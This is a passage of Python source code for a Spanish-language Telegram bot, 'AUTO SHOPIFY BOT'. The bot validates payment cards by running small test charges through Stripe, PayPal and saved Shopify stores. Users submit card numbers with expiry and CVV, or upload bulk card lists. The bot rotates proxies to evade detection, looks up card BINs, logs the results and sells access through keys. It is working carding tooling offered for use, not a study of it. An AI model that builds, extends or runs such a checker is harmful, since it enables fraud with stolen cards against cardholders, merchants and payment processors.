    """Test avanzado de proxies (requiere acceso)"""
    
    proxies = obtener_proxies()
    
    if not proxies:
        bot.reply_to(message, "📭 No hay proxies guardados")
        return
    
    msg = bot.reply_to(message, f"🔬 Testeando {len(proxies)} proxies...")
    
    resultados = {
        'excelente': [],
        'bueno': [],
        'lento': [],
        'parcial': [],
        'muerto': []
    }
    
    for i, proxy in enumerate(proxies, 1):
        # Actualizar progreso
        if i % 3 == 0 or i == len(proxies):
            try:
                bot.edit_message_text(
                    f"🔬 Testeando... {i}/{len(proxies)}",
                    message.chat.id,
                    msg.message_id
                )
            except:
                pass
        
        # Test de socket
        socket_ok, socket_msg = test_proxy_socket(proxy)
        
        if not socket_ok:
            resultados['muerto'].append((proxy, socket_msg))
            actualizar_status_proxy(proxy, 'muerto', socket_msg)
            continue
        
        # Test HTTP
        http_ok, http_msg, tiempo = test_proxy_http(proxy)
        
        if http_ok:
            if tiempo < 2:
                resultados['excelente'].append((proxy, f"{tiempo:.2f}s"))
                actualizar_status_proxy(proxy, 'excelente', f"{tiempo:.2f}s")
            elif tiempo < 5:
                resultados['bueno'].append((proxy, f"{tiempo:.2f}s"))
                actualizar_status_proxy(proxy, 'bueno', f"{tiempo:.2f}s")
            else:
                resultados['lento'].append((proxy, f"{tiempo:.2f}s"))
                actualizar_status_proxy(proxy, 'lento', f"{tiempo:.2f}s")
        else:
            resultados['parcial'].append((proxy, "HTTP falla"))
            actualizar_status_proxy(proxy, 'parcial', "HTTP falla")
    
    # Crear resumen
    texto = f"""🔬 TEST DE PROXIES COMPLETADO
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:

✅ Excelentes: {len(resultados['excelente'])}
👍 Buenos: {len(resultados['bueno'])}
🐢 Lentos: {len(resultados['lento'])}
⚠️ Parciales: {len(resultados['parcial'])}
❌ Muertos: {len(resultados['muerto'])}"""

    try:
        bot.edit_message_text(texto, message.chat.id, msg.message_id)
    except:
        bot.send_message(message.chat.id, texto)

@bot.message_handler(commands=['px'])
@requiere_acceso
def cmd_test_proxies_rapido(message):
    """Test rápido de proxies (requiere acceso)"""
    
    proxies = obtener_proxies()
    
    if not proxies:
        bot.reply_to(message, "📭 No hay proxies guardados")
        return
    
    msg = bot.reply_to(message, f"🔄 Test rápido de {len(proxies)} proxies...")
    
    vivos = 0
    muertos = 0
    
    for i, proxy in enumerate(proxies, 1):
        if i % 5 == 0 or i == len(proxies):
            try:
                bot.edit_message_text(
                    f"🔄 Testeando... {i}/{len(proxies)}",
                    message.chat.id,
                    msg.message_id
                )
            except:
                pass
        
        socket_ok, _ = test_proxy_socket(proxy)
        if socket_ok:
            vivos += 1
        else:
            muertos += 1
    
    texto = f"""✅ TEST RÁPIDO COMPLETADO
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:

✅ Vivos (socket): {vivos}
❌ Muertos: {muertos}

💡 Usa /testproxy para análisis detallado"""
    
    try:
        bot.edit_message_text(texto, message.chat.id, msg.message_id)
    except:
        bot.send_message(message.chat.id, texto)

# ==================== COMANDOS DE PROXIES ====================

@bot.message_handler(commands=['addproxy'])
@requiere_acceso
def cmd_add_proxy(message):
    """Añade un proxy (requiere acceso)"""
    try:
        proxy = message.text.split()[1]
        if guardar_proxy(proxy):
            texto = (
                "╔════════════════════════════╗\n"
                "║     ✅ PROXY GUARDADO      ║\n"
                "╠════════════════════════════╣\n"
                f"║  {proxy[:30]}{'...' if len(proxy)>30 else ''}  ║\n"
                "╚════════════════════════════╝"
            )
        else:
            texto = "❌ Error: El proxy ya existe"
        
        bot.reply_to(message, texto)
    except IndexError:
        bot.reply_to(message, "❌ Uso: /addproxy ip:puerto:user:pass")

@bot.message_handler(commands=['delproxy'])
@requiere_acceso
def cmd_del_proxy(message):
    """Elimina un proxy específico"""
    try:
        proxy = message.text.split()[1]
        if eliminar_proxy(proxy):
            bot.reply_to(message, f"✅ Proxy eliminado: {proxy[:30]}")
        else:
            bot.reply_to(message, "❌ Proxy no encontrado")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /delproxy ip:puerto:user:pass")

@bot.message_handler(commands=['delallproxy'])
@requiere_acceso
def cmd_del_all_proxies(message):
    """Elimina TODOS los proxies"""
    confirmacion = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_proxies')
    btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_proxies')
    confirmacion.add(btn1, btn2)
    
    bot.reply_to(
        message, 
        "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los proxies guardados permanentemente.",
        parse_mode='Markdown',
        reply_markup=confirmacion
    )

@bot.message_handler(commands=['proxies'])
@requiere_acceso
def cmd_list_proxies(message):
    """Lista proxies (requiere acceso)"""
    proxies = obtener_proxies_con_estadisticas()
    
    if not proxies:
        bot.send_message(message.chat.id, "📭 No hay proxies guardados")
        return
    
    texto = "╔════════════════════════════╗\n║     🌐 MIS PROXIES       ║\n╠════════════════════════════╣\n"
    
    for proxy, succ, fail, last_test, status in proxies[:10]:
        proxy_short = proxy[:20] + "..." if len(proxy) > 20 else proxy
        
        # Determinar emoji según status
        if status == 'excelente':
            status_emoji = "✅"
        elif status == 'bueno':
            status_emoji = "👍"
        elif status == 'lento':
            status_emoji = "🐢"
        elif status == 'parcial' or status == 'inestable':
            status_emoji = "⚠️"
        elif status == 'muerto':
            status_emoji = "❌"
        else:
            status_emoji = "⏳"
        
        texto += f"║ {status_emoji} {proxy_short:<22} ║\n║    ├─ ✅ {succ}  ❌ {fail}        ║\n║    └─ 📊 Último test: {last_test[-8:] if last_test else 'N/A'} ║\n"
    
    texto += "╚════════════════════════════╝"
    bot.send_message(message.chat.id, texto)

# ==================== COMANDOS DE SITIOS SHOPIFY ====================

@bot.message_handler(commands=['addsh'])
@requiere_acceso
def cmd_add_sitio(message):
    """Agrega un sitio Shopify"""
    try:
        url = message.text.split()[1]
        if guardar_sitio(url):
            bot.reply_to(message, f"✅ Sitio guardado:\n{url}")
        else:
            bot.reply_to(message, "❌ Error: El sitio ya existe o URL inválida")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /addsh https://tienda.myshopify.com")

@bot.message_handler(commands=['delsh'])
@requiere_acceso
def cmd_del_sitio(message):
    """Elimina un sitio Shopify"""
    try:
        url = message.text.split()[1]
        if eliminar_sitio(url):
            bot.reply_to(message, f"✅ Sitio eliminado: {url[:30]}...")
        else:
            bot.reply_to(message, "❌ Sitio no encontrado")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /delsh https://tienda.myshopify.com")

@bot.message_handler(commands=['sitios'])
@requiere_acceso
def cmd_listar_sitios(message):
    """Lista todos los sitios Shopify"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT url FROM sitios")
    sitios = cursor.fetchall()
    conn.close()
    
    if not sitios:
        bot.send_message(message.chat.id, "📭 No hay sitios guardados")
        return
    
    texto = "╔════════════════════════════╗\n║     🛍️ MIS SITIOS        ║\n╠════════════════════════════╣\n"
    
    for sitio in sitios[:10]:
        url_short = sitio['url'][:25] + "..." if len(sitio['url']) > 25 else sitio['url']
        texto += f"║ • {url_short:<28} ║\n"
    
    texto += "╚════════════════════════════╝"
    bot.send_message(message.chat.id, texto)

# ==================== COMANDOS DE TARJETAS ====================

@bot.message_handler(commands=['check'])
@requiere_acceso
def cmd_check(message):
    """Verificar con Stripe $1.00"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con Stripe $1.00...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_stripe(cc, proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_stripe(cc)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'Stripe', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Stripe")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /check NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp'])
@requiere_acceso
def cmd_pp(message):
    """Verificar con PayPal $10.00"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $10.00...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_paypal(cc, gate=1, proxy=proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_paypal(cc, gate=1)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'PayPal $10', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "PayPal $10")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp2'])
@requiere_acceso
def cmd_pp2(message):
    """Verificar con PayPal $0.10"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $0.10...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_paypal(cc, gate=2, proxy=proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_paypal(cc, gate=2)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'PayPal $0.10', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "PayPal $0.10")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp2 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp3'])
@requiere_acceso
def cmd_pp3(message):
    """Verificar con PayPal $1.00"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $1.00...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_paypal(cc, gate=3, proxy=proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_paypal(cc, gate=3)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'PayPal $1', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "PayPal $1")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp3 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['sh'])
@requiere_acceso
def cmd_shopify(message):
    """Verificar con AutoShopify"""
    try:
        partes = message.text.split()
        cc = partes[1]
        
        # Validar formato de tarjeta
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        # Obtener sitios disponibles
        sitios = obtener_sitios()
        
        if not sitios:
            bot.reply_to(message, "❌ No hay sitios guardados. Usa /addsh para agregar uno.")
            return
        
        # Si se proporciona URL específica
        if len(partes) == 3:
            url = partes[2]
            if url not in sitios:
                bot.reply_to(message, "❌ Sitio no encontrado en tu lista")
                return
        else:
            # Seleccionar sitio aleatorio
            url = random.choice(sitios)
        
        numero = cc.split('|')[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, f"🔍 Verificando con AutoShopify...\nSitio: {url[:30]}...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_autoshopify(cc, url, proxy)
                if not mejor_resultado or resultado['success']:
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_autoshopify(cc, url)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], f"Shopify ${mejor_resultado['amount']}", 
                            mejor_resultado['amount'], mejor_resultado['status'], 
                            mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            # Actualizar estadísticas del sitio
            actualizar_estadisticas_sitio(url, mejor_resultado['success'])
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Shopify")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /sh NUMERO|MES|AÑO|CVV [URL]")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['bin'])
@requiere_acceso
def cmd_bin(message):
    """Consultar información de BIN"""
    try:
        bin_num = message.text.split()[1][:6]
        
        msg = bot.reply_to(message, f"🔍 Consultando BIN {bin_num}...")
        
        bin_info = consultar_bin(bin_num)
        
        if 'error' in bin_info:
            texto = f"❌ Error: {bin_info['error']}"
        else:
            scheme = bin_info.get('scheme', 'UNKNOWN').upper()
            card_type = bin_info.get('type', 'UNKNOWN').upper()
            country_info = bin_info.get('country', {})
            country_name = country_info.get('name', 'Unknown')
            country_emoji = country_info.get('emoji', '🌍')
            bank_info = bin_info.get('bank', {})
            bank_name = bank_info.get('name', 'Unknown')
            
            texto = f"""
📊 *INFORMACIÓN DEL BIN {bin_num}*

🏦 *Esquema:* {scheme}
💳 *Tipo:* {card_type}
🌍 *País:* {country_name} {country_emoji}
🏛️ *Banco:* {bank_name}

🔍 *BIN válido*
            """
        
        bot.edit_message_text(texto, message.chat.id, msg.message_id, parse_mode='Markdown')
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /bin 559888")

# ==================== COMANDOS DE INICIO ====================

@bot.message_handler(commands=['start'])
def cmd_start(message):
    """Comando público - no requiere key"""
    texto = (
        "╔════════════════════════════╗\n"
        "║    🚀  AUTO SHOPIFY BOT    ║\n"
        "╠════════════════════════════╣\n"
        "║  Este bot requiere una     ║\n"
        "║  key de acceso.            ║\n"
        "║                            ║\n"
        "║  Si tienes una key, usa:   ║\n"
        "║  /key TU_KEY_AQUI          ║\n"
        "║                            ║\n"
        "║  Para obtener una key,     ║\n"
        "║  contacta al owner.        ║\n"
        "╚════════════════════════════╝"
    )
    bot.reply_to(message, texto)

@bot.message_handler(commands=['menu'])
@requiere_acceso
def cmd_menu(message):
    """Menú principal (requiere acceso)"""
    texto = (
        "╔════════════════════════════╗\n"
        "║    🚀  AUTO SHOPIFY BOT    ║\n"
        "╠════════════════════════════╣\n"
        "║  Gates disponibles:         ║\n"
        "║  • Stripe: $1.00            ║\n"
        "║  • PayPal: $10/$0.10/$1    ║\n"
        "║  • AutoShopify: variable   ║\n"
        "║                            ║\n"
        "║  Proxies:                   ║\n"
        "║  • /addproxy                ║\n"
        "║  • /testproxy               ║\n"
        "║  • /px (rápido)             ║\n"
        "║                            ║\n"
        "║  Sitios Shopify:            ║\n"
        "║  • /addsh URL               ║\n"
        "║  • /sitios                  ║\n"
        "║                            ║\n"
        "║  Comandos rápidos:          ║\n"
        "║  /check CC - Stripe        ║\n"
        "║  /pp CC - PayPal $10       ║\n"
        "║  /sh CC - AutoShopify      ║\n"
        "╚════════════════════════════╝"
    )
    bot.reply_to(message, texto)

@bot.message_handler(commands=['help'])
@requiere_acceso
def cmd_help(message):
    """Ayuda (requiere acceso)"""
    texto = (
        "╔════════════════════════════╗\n"
        "║        ❓ AYUDA             ║\n"
        "╠════════════════════════════╣\n"
        "║  • Usa /menu para ver      ║\n"
        "║    el menú principal       ║\n"
        "║                            ║\n"
        "║  • Comandos individuales:  ║\n"
        "║    /check CC - Stripe $1   ║\n"
        "║    /pp CC - PayPal $10     ║\n"
        "║    /pp2 CC - PayPal $0.10  ║\n"
        "║    /pp3 CC - PayPal $1     ║\n"
        "║    /sh CC - AutoShopify    ║\n"
        "║                            ║\n"
        "║  • Proxies:                 ║\n"
        "║    /addproxy - Añadir      ║\n"
        "║    /proxies - Listar       ║\n"
        "║    /testproxy - Test avanz ║\n"
        "║    /px - Test rápido       ║\n"
        "║                            ║\n"
        "║  • Sitios:                  ║\n"
        "║    /addsh - Añadir sitio   ║\n"
        "║    /sitios - Listar        ║\n"
        "║    /delsh - Eliminar sitio ║\n"
        "╚════════════════════════════╝"
    )
    bot.reply_to(message, texto)

# ==================== CALLBACKS PARA BOTONES ====================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'confirm_del_all_proxies':
        cantidad = eliminar_todos_proxies()
        bot.edit_message_text(
            f"🗑️ *Se eliminaron {cantidad} proxies*",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown'
        )
    
    elif call.data == 'cancel_del_all_proxies':
        bot.edit_message_text(
            "✅ Operación cancelada",
            call.message.chat.id,
            call.message.message_id
        )

# ==================== ARCHIVOS ====================

@bot.message_handler(content_types=['document'])
@requiere_acceso
def handle_document(message):
    """Maneja archivos .txt (requiere acceso)"""
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Solo acepto archivos .txt")
        return
    
    msg = bot.reply_to(message, "📦 Procesando archivo...")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        contenido = downloaded_file.decode('utf-8')
        
        # Detectar tipo de contenido
        lineas = contenido.strip().split('\n')
        es_tarjeta = False
        es_proxy = False
        es_sitio = False
        
        for linea in lineas[:5]:
            linea = linea.strip()
            if '|' in linea and len(linea.split('|')) == 4:
                es_tarjeta = True
            elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', linea):
                es_proxy = True
            elif re.match(r'^https?://[a-zA-Z0-9-]+\.myshopify\.com/?$', linea):
                es_sitio = True
        
        if es_tarjeta and not es_proxy and not es_sitio:
            guardadas, repetidas, invalidas = guardar_tarjetas_desde_texto(contenido)
            texto = (
                "╔════════════════════════════╗\n"
                "║    ✅ TARJETAS CARGADAS    ║\n"
                "╠════════════════════════════╣\n"
                f"║ 📦 Guardadas: {guardadas:<4}             ║\n"
                f"║ 🔁 Repetidas: {repetidas:<4}             ║\n"
                f"║ ❌ Inválidas: {invalidas:<4}             ║\n"
                "╚════════════════════════════╝"
            )
        
        elif es_proxy:
            guardados, repetidos, invalidos = guardar_proxies_desde_texto(contenido)
            texto = (
                "╔════════════════════════════╗\n"
                "║    ✅ PROXIES CARGADOS     ║\n"
                "╠════════════════════════════╣\n"
                f"║ 📦 Guardados: {guardados:<4}             ║\n"
                f"║ 🔁 Repetidos: {repetidos:<4}             ║\n"
                f"║ ❌ Inválidos: {invalidos:<4}             ║\n"
                "╚════════════════════════════╝"
            )
        
        elif es_sitio:
            guardados, repetidos, invalidos = guardar_sitios_desde_texto(contenido)
            texto = (
                "╔════════════════════════════╗\n"
                "║    ✅ SITIOS CARGADOS      ║\n"
                "╠════════════════════════════╣\n"
                f"║ 📦 Guardados: {guardados:<4}             ║\n"
                f"║ 🔁 Repetidos: {repetidos:<4}             ║\n"
                f"║ ❌ Inválidos: {invalidos:<4}             ║\n"
                "╚════════════════════════════╝"
            )
        
        else:
            texto = "❌ No se pudo identificar el tipo de archivo"
        
        bot.edit_message_text(texto, message.chat.id, msg.message_id)
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", message.chat.id, msg.message_id)

# ==================== MANEJADOR POR DEFECTO ====================

@bot.message_handler(func=lambda m: True)
def default_handler(message):
    if message.text and message.text.startswith('/'):
        # Verificar si es un comando que requiere acceso
        tiene_acceso, _ = verificar_acceso(message)
        if not tiene_acceso and message.from_user.id != OWNER_ID:
            bot.reply_to(
                message, 
                "❌ Necesitas una key para usar el bot.\nUsa /key TU_KEY_AQUI"
            )
        else:
            bot.reply_to(message, "❓ Comando no reconocido. Usa /menu")
    else:
        bot.reply_to(message, "❓ Usa /menu para ver las opciones")

# ==================== INICIO DEL BOT ====================

if __name__ == "__main__":
    print("="*80)
    print("🤖 AUTO SHOPIFY BOT - VERSIÓN COMPLETA")
    print("="*80)
    print(f"👑 Owner ID: {OWNER_ID}")
    print("✅ Sistema de keys activado")
    print("✅ BIN lookup mejorado (bincheck.io)")
    print("✅ Test de proxies avanzado")
    print("="*80)
    print("📱 Usa /start para comenzar")
    print("="*80)
    
    # Para Railway, usamos polling con timeout
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"❌ Error en polling: {e}")
        time.sleep(10)
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
